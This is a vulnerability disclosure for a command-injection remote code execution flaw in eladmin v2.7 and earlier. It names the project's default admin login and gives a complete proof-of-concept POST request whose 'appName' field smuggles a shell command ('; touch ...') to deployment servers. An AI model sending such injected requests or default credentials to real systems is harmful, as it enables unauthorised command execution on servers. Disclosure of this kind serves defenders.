# eladmin_rce

BUG_Author: shadia0

Affected version: eladmin v2.7 and before

Project Link: https://github.com/elunez/eladmin

URL: /api/deploy/serverReduction

Parameter: "appName"(POST)

## Description:

The eladmin v2.7 and before has an RCE that can control all application deployment servers of this management system.
1. Log in to the backend with the project's default password `admin/123456`.

2. First simulate normal operation and maintenance operations, create some servers, and deploy some applications on these servers. Here I run a docker locally and map it to port `2222` to simulate the server where the application is deployed
<img width="1356" alt="image" src="https://github.com/user-attachments/assets/caa67c05-3585-4eaa-bd42-d61710923c9f">
Create an application to be deployed arbitrarily.
<img width="1346" alt="image" src="https://github.com/user-attachments/assets/bd35a77f-4008-4efd-a648-f678012bfe78">
Then proceed with the deployment.
<img width="1387" alt="image" src="https://github.com/user-attachments/assets/19f828a6-2fb8-45f3-a429-adcec3341324">
After the application is deployed, we have simulated a backend that is managing sub-servers and applications.

4. Select '运维管理(Operations Management)' - '部署管理(Deployment Management)' from the menu bar in order, and you can see the '系统还原(System Recovery)' function on the right, which is to restore the system with backups. I don't have a backup here, but I can directly construct a request to send to the backend interface. The parameter for command execution is `appName`, and the POC is as follows::
<img width="1469" alt="image" src="https://github.com/user-attachments/assets/40f727d5-f04e-451f-a8cb-9262131e5a02">

```
POST /api/deploy/serverReduction HTTP/1.1
Host: localhost:8013
Content-Length: 81
sec-ch-ua: 
Accept: application/json, text/plain, */*
Content-Type: application/json
sec-ch-ua-mobile: ?0
Authorization: Bearer eyJhbGciOiJIUzUxMiJ9.eyJqdGkiOiJiM2E5OWNkY2NiNzk0NzRjOGUzYTUyN2E1ZmUzY2NiYiIsInVzZXIiOiJhZG1pbiIsInN1YiI6ImFkbWluIn0.NmbDtGywNsCE1dtK8ilWCwsEoPxO5F-aqj2jBIzyq45EDYfF9-PTqakUJz50fRo-D-sX8cBJpwQAUZpevgyijQ
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.110 Safari/537.36
sec-ch-ua-platform: ""
Origin: http://localhost:8013
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: http://localhost:8013/mnt/mnt/serverDeploy
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close

{"id":10000,"appName":"myapp; touch YouknoWhoIs","ip":"127.0.0.1","deployID":1}
```

3. Moreover, the exploitation condition of this POC is that `deployID` exists and `ip` exists (but these two parameters do not need to correspond), and other parameters have no effect. DeployID starts from 1 and increments, which is easy to obtain. This means that as long as you know a correct application deployment server address, you can execute any command on it. The following picture proves that the command was successfully executed in my docker.
<img width="551" alt="image" src="https://github.com/user-attachments/assets/4dfd57f4-e922-451f-94e5-680710715f1f">

In the website log, the command execution was caused by concatenating the delete command.
<img width="1258" alt="image" src="https://github.com/user-attachments/assets/c75e5c91-a3cb-4419-afec-683c2c134506">

